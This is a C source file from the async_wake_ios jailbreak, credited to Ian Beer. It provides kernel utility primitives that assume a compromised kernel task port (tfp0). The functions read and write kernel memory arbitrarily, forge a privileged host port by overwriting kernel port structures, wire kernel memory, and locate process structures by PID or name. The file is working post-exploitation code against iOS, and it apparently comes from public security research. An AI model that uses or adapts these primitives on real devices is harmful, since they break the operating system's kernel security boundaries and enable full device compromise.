//
//  *.c
//  async_wake_ios
//
//  Created by George on 18/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "kern_utils.h"
#include "patchfinder64.h"
#include "offsetof.h"

/****** Kernel utility stuff ******/

mach_port_t tfpzero;

void init_kernel_utils(mach_port_t tfp0) {
    tfpzero = tfp0;
}

uint64_t kalloc(vm_size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}


uint64_t task_self_addr() {
    uint64_t selfproc = proc_for_pid(getpid());
    if (selfproc == 0) {
        fprintf(stderr, "failed to find our task addr\n");
        exit(EXIT_FAILURE);
    }
    uint64_t addr = kread64(selfproc + offsetof_task);
    return addr;
}

uint64_t ipc_space_kernel() {
    return kread64(task_self_addr() + 060);
}

uint64_t find_port_address(mach_port_name_t port) {
   
    uint64_t task_addr = task_self_addr();
    uint64_t itk_space = kread64(task_addr + offsetof_itk_space);
    
    uint64_t is_table = kread64(itk_space + offsetof_ipc_space_is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;

    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));

    return port_addr;
}

mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv() {
    if (fake_host_priv_port != MACH_PORT_NULL) {
        return fake_host_priv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = find_port_address(mach_host_self());
    uint64_t realhost = kread64(hostport_addr + offsetof_ip_kobject);
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = find_port_address(port);
    
    // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE   0x80000000
    kwrite32(port_addr + 0, IO_ACTIVE|IKOT_HOST_PRIV);
    
    // change the space of the port
    kwrite64(port_addr + 0x60, ipc_space_kernel());
    
    // set the kobject
    kwrite64(port_addr + offsetof_ip_kobject, realhost);
    
    fake_host_priv_port = port;
    
    return port;
}
    
uint64_t kmem_alloc_wired(uint64_t size) {
    if (tfpzero == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
    printf("vm_kernel_page_size: %lx\n", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfpzero, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    
    printf("allocated address: %llx\n", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    printf("address to wire: %llx\n", addr);
    
    err = mach_vm_wire(fake_host_priv(), tfpzero, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        printf("unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}


size_t kread(uint64_t where, void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            printf("[*] error on kread(0x%016llx)\n", (offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(where, &out, sizeof(uint32_t));
    return out;
}

uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(where, &out, sizeof(uint64_t));
    return out;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, chunk);
        if (rv) {
            printf("[*] error on kwrite(0x%016llx)\n", (offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

void kwrite32(uint64_t where, uint32_t what) {
    uint32_t _what = what;
    kwrite(where, &_what, sizeof(uint32_t));
}


void kwrite64(uint64_t where, uint64_t what) {
    uint64_t _what = what;
    kwrite(where, &_what, sizeof(uint64_t));
}

uint64_t proc_for_pid(pid_t pid) {
    uint64_t proc = kread64(find_allproc()), pd;
    while (proc) {
        pd = kread32(proc + offsetof_p_pid);
        if (pd == pid) return proc;
        proc = kread64(proc);
    }
    
    return 0;
}
uint64_t proc_for_name(char *nm) {
    uint64_t proc = kread64(find_allproc());
    char name[40] = {0};
    while (proc) {
        kread(proc + 0x268, name, 20);
        if (strstr(name, nm)) return proc;
        proc = kread64(proc);
    }
    return 0;
}
